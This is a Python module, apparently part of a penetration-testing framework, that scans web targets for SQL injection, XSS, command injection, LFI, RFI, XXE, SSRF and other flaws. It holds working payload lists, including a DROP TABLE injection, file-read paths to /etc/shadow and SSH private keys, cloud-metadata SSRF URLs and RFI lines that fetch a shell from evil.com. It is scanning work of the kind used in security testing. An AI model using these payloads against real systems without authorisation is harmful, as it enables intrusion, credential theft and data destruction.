"""
Vulnerability scanner module for Ultra Penetration Testing Framework v5.0
Handles various types of vulnerability scanning
"""

import requests
import re
import time
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
from typing import List, Dict, Any, Optional, Tuple
from utils import Colors, Logger, ToolChecker, save_to_file
from dataclasses import dataclass


@dataclass
class ScanTarget:
    """Represents a scan target"""
    url: str
    method: str = 'GET'
    data: Dict[str, str] = None
    headers: Dict[str, str] = None

    def __post_init__(self):
        if self.data is None:
            self.data = {}
        if self.headers is None:
            self.headers = {}


@dataclass
class Vulnerability:
    """Represents a found vulnerability"""
    vuln_type: str
    severity: str
    url: str
    parameter: str = ""
    payload: str = ""
    detail: str = ""
    cvss_score: float = 0.0
    risk_score: float = 0.0
    exploit_available: bool = False


class VulnerabilityScanner:
    """Comprehensive vulnerability scanner"""

    def __init__(self, target: str, logger: Logger, session: requests.Session = None):
        self.target = target
        self.parsed_url = urlparse(target if target.startswith('http') else f'http://{target}')
        self.domain = self.parsed_url.netloc or self.parsed_url.path
        self.logger = logger
        self.session = session or requests.Session()
        self.session.verify = False
        self.timeout = 10

        # Discovered data from reconnaissance
        self.forms: List[Dict[str, Any]] = []
        self.parameters: Dict[str, List[str]] = {}
        self.endpoints: List[str] = []
        self.technologies: Dict[str, str] = {}

        # Scan results
        self.vulnerabilities: List[Vulnerability] = []

        # Payload databases
        self.sql_payloads = self._load_sql_payloads()
        self.xss_payloads = self._load_xss_payloads()
        self.lfi_payloads = self._load_lfi_payloads()
        self.command_payloads = self._load_command_payloads()

    def run_comprehensive_scan(self, forms: List[Dict[str, Any]] = None,
                             parameters: Dict[str, List[str]] = None,
                             endpoints: List[str] = None,
                             technologies: Dict[str, str] = None) -> List[Vulnerability]:
        """Run comprehensive vulnerability scan"""
        self.logger.info("Starting comprehensive vulnerability scan...")

        # Update discovered data
        if forms:
            self.forms = forms
        if parameters:
            self.parameters = parameters
        if endpoints:
            self.endpoints = endpoints
        if technologies:
            self.technologies = technologies

        # Run all scan types
        scan_methods = [
            self.scan_sql_injection,
            self.scan_xss,
            self.scan_command_injection,
            self.scan_lfi,
            self.scan_rfi,
            self.scan_csrf,
            self.scan_idor,
            self.scan_xxe,
            self.scan_ssrf,
            self.scan_open_redirect,
            self.scan_host_header_injection,
            self.scan_http_methods,
            self.scan_security_headers,
            self.scan_cors,
            self.scan_clickjacking,
            self.scan_directory_traversal
        ]

        for scan_method in scan_methods:
            try:
                scan_method()
            except Exception as e:
                self.logger.error(f"Scan method {scan_method.__name__} failed: {e}")

        self.logger.info(f"Comprehensive scan completed. Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities

    def scan_sql_injection(self):
        """Scan for SQL injection vulnerabilities"""
        self.logger.info("Scanning for SQL injection vulnerabilities...")

        for form in self.forms:
            if form.get('method', 'GET').upper() == 'GET':
                for param in form.get('inputs', []):
                    if param.get('type') == 'text':
                        for payload in self.sql_payloads[:10]:  # Limit payloads for efficiency
                            target = ScanTarget(
                                url=form['action'],
                                method='GET',
                                data={param['name']: payload}
                            )
                            if self._test_sql_injection(target, param['name'], payload):
                                break

    def _test_sql_injection(self, target: ScanTarget, param: str, payload: str) -> bool:
        """Test for SQL injection"""
        try:
            if target.method == 'GET':
                params = target.data
                response = self.session.get(target.url, params=params, timeout=self.timeout)
            else:
                response = self.session.post(target.url, data=target.data, timeout=self.timeout)

            # Check for SQL error patterns
            sql_errors = [
                'sql syntax', 'mysql error', 'postgresql error', 'oracle error',
                'sqlite error', 'sql server error', 'odbc error', 'syntax error'
            ]

            response_text = response.text.lower()
            if any(error in response_text for error in sql_errors):
                vuln = Vulnerability(
                    vuln_type='SQL Injection',
                    severity='HIGH',
                    url=target.url,
                    parameter=param,
                    payload=payload,
                    detail=f'SQL injection vulnerability in parameter {param}',
                    cvss_score=8.5,
                    risk_score=8.5,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info(f"SQL Injection found: {target.url} param {param}")
                return True
        except Exception as e:
            self.logger.debug(f"SQL injection test failed: {e}")

        return False

    def scan_xss(self):
        """Scan for Cross-Site Scripting vulnerabilities"""
        self.logger.info("Scanning for XSS vulnerabilities...")

        for form in self.forms:
            for param in form.get('inputs', []):
                if param.get('type') in ['text', 'search', 'url', 'email']:
                    for payload in self.xss_payloads[:10]:  # Limit payloads
                        target = ScanTarget(
                            url=form['action'],
                            method=form.get('method', 'GET').upper(),
                            data={param['name']: payload}
                        )
                        if self._test_xss(target, param['name'], payload):
                            break

    def _test_xss(self, target: ScanTarget, param: str, payload: str) -> bool:
        """Test for XSS"""
        try:
            if target.method == 'GET':
                params = target.data
                response = self.session.get(target.url, params=params, timeout=self.timeout)
            else:
                response = self.session.post(target.url, data=target.data, timeout=self.timeout)

            # Check if payload is reflected
            if payload in response.text:
                vuln = Vulnerability(
                    vuln_type='Cross-Site Scripting (XSS)',
                    severity='MEDIUM',
                    url=target.url,
                    parameter=param,
                    payload=payload,
                    detail=f'XSS vulnerability in parameter {param}',
                    cvss_score=6.1,
                    risk_score=6.1,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info(f"XSS found: {target.url} param {param}")
                return True
        except Exception as e:
            self.logger.debug(f"XSS test failed: {e}")

        return False

    def scan_command_injection(self):
        """Scan for command injection vulnerabilities"""
        self.logger.info("Scanning for command injection vulnerabilities...")

        for form in self.forms:
            for param in form.get('inputs', []):
                if param.get('type') == 'text':
                    for payload in self.command_payloads[:5]:  # Limit payloads
                        target = ScanTarget(
                            url=form['action'],
                            method=form.get('method', 'GET').upper(),
                            data={param['name']: payload}
                        )
                        if self._test_command_injection(target, param['name'], payload):
                            break

    def _test_command_injection(self, target: ScanTarget, param: str, payload: str) -> bool:
        """Test for command injection"""
        try:
            if target.method == 'GET':
                params = target.data
                response = self.session.get(target.url, params=params, timeout=self.timeout)
            else:
                response = self.session.post(target.url, data=target.data, timeout=self.timeout)

            # Check for command execution indicators
            indicators = ['uid=', 'gid=', 'root', 'bin/bash', 'command not found']
            response_text = response.text.lower()

            if any(indicator in response_text for indicator in indicators):
                vuln = Vulnerability(
                    vuln_type='Command Injection',
                    severity='CRITICAL',
                    url=target.url,
                    parameter=param,
                    payload=payload,
                    detail=f'Command injection vulnerability in parameter {param}',
                    cvss_score=9.8,
                    risk_score=9.8,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info(f"Command injection found: {target.url} param {param}")
                return True
        except Exception as e:
            self.logger.debug(f"Command injection test failed: {e}")

        return False

    def scan_lfi(self):
        """Scan for Local File Inclusion vulnerabilities"""
        self.logger.info("Scanning for LFI vulnerabilities...")

        for form in self.forms:
            for param in form.get('inputs', []):
                if param.get('type') == 'text':
                    for payload in self.lfi_payloads[:5]:  # Limit payloads
                        target = ScanTarget(
                            url=form['action'],
                            method=form.get('method', 'GET').upper(),
                            data={param['name']: payload}
                        )
                        if self._test_lfi(target, param['name'], payload):
                            break

    def _test_lfi(self, target: ScanTarget, param: str, payload: str) -> bool:
        """Test for LFI"""
        try:
            if target.method == 'GET':
                params = target.data
                response = self.session.get(target.url, params=params, timeout=self.timeout)
            else:
                response = self.session.post(target.url, data=target.data, timeout=self.timeout)

            # Check for file content indicators
            indicators = ['root:', 'bin:', 'daemon:', 'sys:', 'passwd file']
            response_text = response.text.lower()

            if any(indicator in response_text for indicator in indicators):
                vuln = Vulnerability(
                    vuln_type='Local File Inclusion (LFI)',
                    severity='HIGH',
                    url=target.url,
                    parameter=param,
                    payload=payload,
                    detail=f'LFI vulnerability in parameter {param}',
                    cvss_score=7.5,
                    risk_score=7.5,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info(f"LFI found: {target.url} param {param}")
                return True
        except Exception as e:
            self.logger.debug(f"LFI test failed: {e}")

        return False

    def scan_rfi(self):
        """Scan for Remote File Inclusion vulnerabilities"""
        self.logger.info("Scanning for RFI vulnerabilities...")

        rfi_payloads = [
            "http://evil.com/shell.php",
            "https://pastebin.com/raw/example",
            "http://127.0.0.1:8080/malicious.php"
        ]

        for form in self.forms:
            for param in form.get('inputs', []):
                if param.get('type') == 'text':
                    for payload in rfi_payloads:
                        target = ScanTarget(
                            url=form['action'],
                            method=form.get('method', 'GET').upper(),
                            data={param['name']: payload}
                        )
                        if self._test_rfi(target, param['name'], payload):
                            break

    def _test_rfi(self, target: ScanTarget, param: str, payload: str) -> bool:
        """Test for RFI"""
        try:
            if target.method == 'GET':
                params = target.data
                response = self.session.get(target.url, params=params, timeout=self.timeout)
            else:
                response = self.session.post(target.url, data=target.data, timeout=self.timeout)

            # Check if external content is included
            if 'evil.com' in response.text or 'pastebin' in response.text:
                vuln = Vulnerability(
                    vuln_type='Remote File Inclusion (RFI)',
                    severity='CRITICAL',
                    url=target.url,
                    parameter=param,
                    payload=payload,
                    detail=f'RFI vulnerability in parameter {param}',
                    cvss_score=9.8,
                    risk_score=9.8,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info(f"RFI found: {target.url} param {param}")
                return True
        except Exception as e:
            self.logger.debug(f"RFI test failed: {e}")

        return False

    def scan_csrf(self):
        """Scan for Cross-Site Request Forgery vulnerabilities"""
        self.logger.info("Scanning for CSRF vulnerabilities...")

        for form in self.forms:
            has_csrf_token = False
            for param in form.get('inputs', []):
                if 'csrf' in param['name'].lower() or 'token' in param['name'].lower():
                    has_csrf_token = True
                    break

            if not has_csrf_token:
                vuln = Vulnerability(
                    vuln_type='Cross-Site Request Forgery (CSRF)',
                    severity='MEDIUM',
                    url=form['action'],
                    detail='Form lacks CSRF protection token',
                    cvss_score=4.3,
                    risk_score=4.3,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info(f"CSRF vulnerability found: {form['action']}")

    def scan_idor(self):
        """Scan for Insecure Direct Object Reference vulnerabilities"""
        self.logger.info("Scanning for IDOR vulnerabilities...")

        idor_patterns = [
            '/user/1', '/user/2', '/profile/1', '/profile/2',
            '/admin/user/1', '/admin/user/2', '/api/user/1', '/api/user/2'
        ]

        for pattern in idor_patterns:
            url = urljoin(self.target, pattern)
            try:
                response1 = self.session.get(url, timeout=self.timeout)
                if response1.status_code == 200:
                    # Try to access another resource
                    url2 = url.replace('1', '2')
                    response2 = self.session.get(url2, timeout=self.timeout)
                    if response1.text != response2.text:
                        vuln = Vulnerability(
                            vuln_type='Insecure Direct Object Reference (IDOR)',
                            severity='HIGH',
                            url=url,
                            detail='IDOR vulnerability allows unauthorized access to resources',
                            cvss_score=7.5,
                            risk_score=7.5,
                            exploit_available=True
                        )
                        self.vulnerabilities.append(vuln)
                        self.logger.info(f"IDOR found: {url}")
                        break
            except:
                continue

    def scan_xxe(self):
        """Scan for XML External Entity vulnerabilities"""
        self.logger.info("Scanning for XXE vulnerabilities...")

        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

        for form in self.forms:
            for param in form.get('inputs', []):
                if param.get('type') == 'text':
                    target = ScanTarget(
                        url=form['action'],
                        method=form.get('method', 'GET').upper(),
                        data={param['name']: xxe_payload}
                    )

                    try:
                        if target.method == 'GET':
                            params = target.data
                            response = self.session.get(target.url, params=params, timeout=self.timeout)
                        else:
                            response = self.session.post(target.url, data=target.data, timeout=self.timeout)

                        if 'root:' in response.text:
                            vuln = Vulnerability(
                                vuln_type='XML External Entity (XXE)',
                                severity='HIGH',
                                url=target.url,
                                parameter=param['name'],
                                payload=xxe_payload,
                                detail=f'XXE vulnerability in parameter {param["name"]}',
                                cvss_score=7.5,
                                risk_score=7.5,
                                exploit_available=True
                            )
                            self.vulnerabilities.append(vuln)
                            self.logger.info(f"XXE found: {target.url} param {param['name']}")
                            break
                    except Exception as e:
                        self.logger.debug(f"XXE test failed: {e}")

    def scan_ssrf(self):
        """Scan for Server-Side Request Forgery vulnerabilities"""
        self.logger.info("Scanning for SSRF vulnerabilities...")

        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:2375/v1.24/containers/json"
        ]

        for form in self.forms:
            for param in form.get('inputs', []):
                if param.get('type') == 'text':
                    for payload in ssrf_payloads:
                        target = ScanTarget(
                            url=form['action'],
                            method=form.get('method', 'GET').upper(),
                            data={param['name']: payload}
                        )

                        try:
                            if target.method == 'GET':
                                params = target.data
                                response = self.session.get(target.url, params=params, timeout=self.timeout)
                            else:
                                response = self.session.post(target.url, data=target.data, timeout=self.timeout)

                            # Check for SSRF indicators
                            indicators = ['meta-data', 'instance', 'docker', 'containers']
                            if any(indicator in response.text.lower() for indicator in indicators):
                                vuln = Vulnerability(
                                    vuln_type='Server-Side Request Forgery (SSRF)',
                                    severity='HIGH',
                                    url=target.url,
                                    parameter=param['name'],
                                    payload=payload,
                                    detail=f'SSRF vulnerability in parameter {param["name"]}',
                                    cvss_score=8.6,
                                    risk_score=8.6,
                                    exploit_available=True
                                )
                                self.vulnerabilities.append(vuln)
                                self.logger.info(f"SSRF found: {target.url} param {param['name']}")
                                break
                        except Exception as e:
                            self.logger.debug(f"SSRF test failed: {e}")

    def scan_open_redirect(self):
        """Scan for Open Redirect vulnerabilities"""
        self.logger.info("Scanning for open redirect vulnerabilities...")

        redirect_payloads = [
            "http://evil.com",
            "//evil.com",
            "https://evil.com",
            "/\\evil.com"
        ]

        for form in self.forms:
            for param in form.get('inputs', []):
                if param.get('type') in ['text', 'url']:
                    for payload in redirect_payloads:
                        target = ScanTarget(
                            url=form['action'],
                            method=form.get('method', 'GET').upper(),
                            data={param['name']: payload}
                        )

                        try:
                            if target.method == 'GET':
                                params = target.data
                                response = self.session.get(target.url, params=params, timeout=self.timeout, allow_redirects=False)
                            else:
                                response = self.session.post(target.url, data=target.data, timeout=self.timeout, allow_redirects=False)

                            if response.status_code in [301, 302, 303, 307, 308]:
                                location = response.headers.get('Location', '')
                                if 'evil.com' in location:
                                    vuln = Vulnerability(
                                        vuln_type='Open Redirect',
                                        severity='MEDIUM',
                                        url=target.url,
                                        parameter=param['name'],
                                        payload=payload,
                                        detail=f'Open redirect vulnerability in parameter {param["name"]}',
                                        cvss_score=6.1,
                                        risk_score=6.1,
                                        exploit_available=True
                                    )
                                    self.vulnerabilities.append(vuln)
                                    self.logger.info(f"Open redirect found: {target.url} param {param['name']}")
                                    break
                        except Exception as e:
                            self.logger.debug(f"Open redirect test failed: {e}")

    def scan_host_header_injection(self):
        """Scan for Host header injection vulnerabilities"""
        self.logger.info("Scanning for host header injection...")

        try:
            # Test host header injection
            headers = {'Host': 'evil.com'}
            response = self.session.get(self.target, headers=headers, timeout=self.timeout)

            # Check if the response indicates host header processing
            if 'evil.com' in response.text or response.status_code == 200:
                vuln = Vulnerability(
                    vuln_type='Host Header Injection',
                    severity='MEDIUM',
                    url=self.target,
                    detail='Host header injection vulnerability detected',
                    cvss_score=5.3,
                    risk_score=5.3,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info("Host header injection found")
        except Exception as e:
            self.logger.debug(f"Host header injection test failed: {e}")

    def scan_http_methods(self):
        """Scan for dangerous HTTP methods"""
        self.logger.info("Scanning HTTP methods...")

        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS']

        for method in dangerous_methods:
            try:
                response = self.session.request(method, self.target, timeout=self.timeout)
                if response.status_code not in [405, 501]:  # Method not allowed or not implemented
                    vuln = Vulnerability(
                        vuln_type='Dangerous HTTP Method',
                        severity='LOW',
                        url=self.target,
                        detail=f'Dangerous HTTP method {method} is enabled',
                        cvss_score=2.7,
                        risk_score=2.7,
                        exploit_available=False
                    )
                    self.vulnerabilities.append(vuln)
                    self.logger.info(f"Dangerous HTTP method enabled: {method}")
            except Exception as e:
                self.logger.debug(f"HTTP method test failed for {method}: {e}")

    def scan_security_headers(self):
        """Scan for missing security headers"""
        self.logger.info("Scanning security headers...")

        try:
            response = self.session.get(self.target, timeout=self.timeout)
            headers = response.headers

            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'X-XSS-Protection': 'XSS protection',
                'Content-Security-Policy': 'CSP protection',
                'Strict-Transport-Security': 'HSTS',
                'Referrer-Policy': 'Referrer control',
                'Permissions-Policy': 'Permissions control'
            }

            for header, description in security_headers.items():
                if header not in headers:
                    vuln = Vulnerability(
                        vuln_type='Missing Security Header',
                        severity='MEDIUM',
                        url=self.target,
                        detail=f'Missing {header}: {description}',
                        cvss_score=4.3,
                        risk_score=4.3,
                        exploit_available=False
                    )
                    self.vulnerabilities.append(vuln)
                    self.logger.info(f"Missing security header: {header}")

        except Exception as e:
            self.logger.error(f"Security headers scan failed: {e}")

    def scan_cors(self):
        """Scan for CORS misconfigurations"""
        self.logger.info("Scanning CORS configuration...")

        try:
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(self.target, headers=headers, timeout=self.timeout)

            cors_headers = ['Access-Control-Allow-Origin', 'Access-Control-Allow-Credentials']

            for header in cors_headers:
                if header in response.headers:
                    value = response.headers[header]
                    if value == '*' or 'evil.com' in value:
                        vuln = Vulnerability(
                            vuln_type='CORS Misconfiguration',
                            severity='MEDIUM',
                            url=self.target,
                            detail=f'CORS header {header} allows unauthorized origins',
                            cvss_score=4.3,
                            risk_score=4.3,
                            exploit_available=True
                        )
                        self.vulnerabilities.append(vuln)
                        self.logger.info(f"CORS misconfiguration found: {header}")

        except Exception as e:
            self.logger.debug(f"CORS scan failed: {e}")

    def scan_clickjacking(self):
        """Scan for clickjacking vulnerabilities"""
        self.logger.info("Scanning for clickjacking...")

        try:
            response = self.session.get(self.target, timeout=self.timeout)
            headers = response.headers

            if 'X-Frame-Options' not in headers:
                vuln = Vulnerability(
                    vuln_type='Clickjacking',
                    severity='MEDIUM',
                    url=self.target,
                    detail='Missing X-Frame-Options header allows clickjacking',
                    cvss_score=4.3,
                    risk_score=4.3,
                    exploit_available=True
                )
                self.vulnerabilities.append(vuln)
                self.logger.info("Clickjacking vulnerability found")

        except Exception as e:
            self.logger.debug(f"Clickjacking scan failed: {e}")

    def scan_directory_traversal(self):
        """Scan for directory traversal vulnerabilities"""
        self.logger.info("Scanning for directory traversal...")

        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]

        for payload in traversal_payloads:
            try:
                params = {'file': payload}
                response = self.session.get(self.target, params=params, timeout=self.timeout)

                if 'root:' in response.text or 'bin:' in response.text:
                    vuln = Vulnerability(
                        vuln_type='Directory Traversal',
                        severity='HIGH',
                        url=self.target,
                        parameter='file',
                        payload=payload,
                        detail='Directory traversal vulnerability allows file access',
                        cvss_score=7.5,
                        risk_score=7.5,
                        exploit_available=True
                    )
                    self.vulnerabilities.append(vuln)
                    self.logger.info("Directory traversal found")
                    break
            except Exception as e:
                self.logger.debug(f"Directory traversal test failed: {e}")

    def _load_sql_payloads(self) -> List[str]:
        """Load SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "' UNION SELECT database() --",
            "' UNION SELECT user() --",
            "' UNION SELECT password FROM users --",
            "'; DROP TABLE users --",
            "' AND 1=0 UNION SELECT username, password FROM users --",
            "' OR ''='",
            "' OR 'x'='x"
        ]

    def _load_xss_payloads(self) -> List[str]:
        """Load XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>Hover me</div>",
            "<input onfocus=alert('XSS') autofocus>",
            "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">"
        ]

    def _load_lfi_payloads(self) -> List[str]:
        """Load LFI payloads"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../../../etc/passwd",
            "../../../../../../../etc/shadow",
            "../../../../../../../etc/hosts",
            "../../../../../../../proc/self/environ",
            "../../../../../../../var/log/apache2/access.log",
            "../../../../../../../var/log/nginx/access.log",
            "../../../../../../../home/user/.ssh/id_rsa",
            "../../../../../../../root/.ssh/id_rsa"
        ]

    def _load_command_payloads(self) -> List[str]:
        """Load command injection payloads"""
        return [
            "; ls",
            "| ls",
            "`ls`",
            "$(ls)",
            "; whoami",
            "| whoami",
            "; id",
            "| id",
            "; uname -a",
            "| uname -a"
        ]

    def save_results(self, output_dir: str):
        """Save scan results to files"""
        results = {
            'vulnerabilities': [
                {
                    'type': v.vuln_type,
                    'severity': v.severity,
                    'url': v.url,
                    'parameter': v.parameter,
                    'payload': v.payload,
                    'detail': v.detail,
                    'cvss_score': v.cvss_score,
                    'risk_score': v.risk_score,
                    'exploit_available': v.exploit_available
                } for v in self.vulnerabilities
            ]
        }

        save_to_file(f"{output_dir}/scan_results.json", json.dumps(results, indent=2))
        self.logger.info(f"Scan results saved to {output_dir}/scan_results.json")
